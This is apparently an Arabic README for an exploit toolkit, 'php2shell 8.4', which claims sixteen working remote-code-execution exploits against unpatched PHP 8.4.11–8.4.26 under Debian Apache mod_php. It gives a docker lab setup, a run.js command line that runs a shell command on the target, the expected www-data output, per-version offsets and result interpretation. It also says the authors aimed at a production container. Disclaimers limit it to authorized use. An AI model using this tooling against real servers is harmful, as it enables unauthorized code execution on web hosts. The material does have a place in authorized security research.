# php2shell 8.4 — Debian Apache (mod_php)

16 استغلالاً عاملاً لإصدارات **PHP 8.4 قبل الإصلاح**، على هدف
**Debian + Apache mod_php** (`apache2handler`) باستخدام ملف
`php.ini-production`.

> **للاستخدام المصرح به فقط.** شغّل هذه الأدوات في مختبرك أو على هدف لديك
> إذن كتابي بشأنه. النجاح يعني وجود ملف proof على الهدف؛ وبدون proof
> فالنتيجة **ليست RCE**.

اللغات: [pt-BR](../../README.md) · [English](README.en.md) · [中文](README.zh.md) ·
[فارسی](README.fa.md) · [العربية](README.ar.md) · [Русский](README.ru.md) ·
[한국어](README.ko.md)




بحثنا الثغرة بشكل مستقل انطلاقاً من الإشعار الأولي، وبنينا PoC في المختبر، ثم ركزنا على الوصول إلى حاوية إنتاجية.

## الإصدارات المشمولة (16)

| النطاق | الإصدارات | `s_off` للمرحلة 3 |
|:--|:--|:--|
| 8.4.11–8.4.26 | 16 إصداراً | `0xF8398` |

## محتويات المستودع

```text
engine/pure_fixed.js     محرك A1→B1→A2→B2
profiles/*.json          16 ملف تعريف: الرموز، s_off، المتطلبات
run.js                   يختار الملف ويشغّل المحرك
target/                  php.ini-production + Apache prefork 150 + index.php
tests/*.test.js   التحقق من الملفات الـ16
```

`run.js` بفحص شامل: يشغّل **إصداراً واحداً** في كل مرة مع ملف proof.

## المتطلبات

- Node.js 20+ على جهاز المشغّل.
- Docker على الهدف/المختبر.
- صورة رسمية `php:<version>-apache` (Debian) مع تركيب
  `target/php.ini` و`target/apache.conf`.
- وحدة تخزين مشتركة للـ proof (`/out` على الهدف).

## بدء سريع (مختبر محلي)

```bash
mkdir -p out
docker run -d --name p2s-8426 -p 19300:80 \
  -v "$PWD/target/php.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/target/apache.conf:/etc/apache2/conf-enabled/zz-prod.conf:ro" \
  -v "$PWD/target/www:/var/www/html:ro" \
  -v "$PWD/out:/out" \
  php:8.4.26-apache

./run.js --version 8.4.26 --host 127.0.0.1 --port 19300 \
  --proof out/p1 --cmd 'id>/out/p1' --retries 4 --probes 6

cat out/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

غيّر `8.4.26` إلى أي إصدار مغطى، وعدّل وسم الصورة وفقاً لذلك.

## قراءة النتيجة

| الخرج | المعنى |
|:--|:--|
| `out/p1` يحتوي `uid=...` | تم إثبات التنفيذ |
| المحرك يقول proof لكن الملف فارغ | **ليست RCE**؛ فشل |
| `leak failed` / `no proof` | لم يُنفّذ؛ أعد تشغيل الهدف وحاول مجدداً |

ابدأ كل محاولة بـ worker نظيف. لا يعيد `run.js` تشغيل الحاوية تلقائياً.

## حدود صادقة

- الصلاحية `www-data` وليست root.
- تعتمد النتيجة على بناء الصورة الدقيق؛ ثبّت tag/digest عند التكرار.

## الاختبارات

```bash
node --test
```

## الوثائق

- `docs/como-reproduzir.md` — خطوات وإصلاح الأخطاء (pt-BR).

## تنبيه

هذه مواد بحث أمني مصرح به. لا تستخدمها ضد أنظمة طرف ثالث دون إذن.
المسؤولية عن الاستخدام تقع على المشغّل.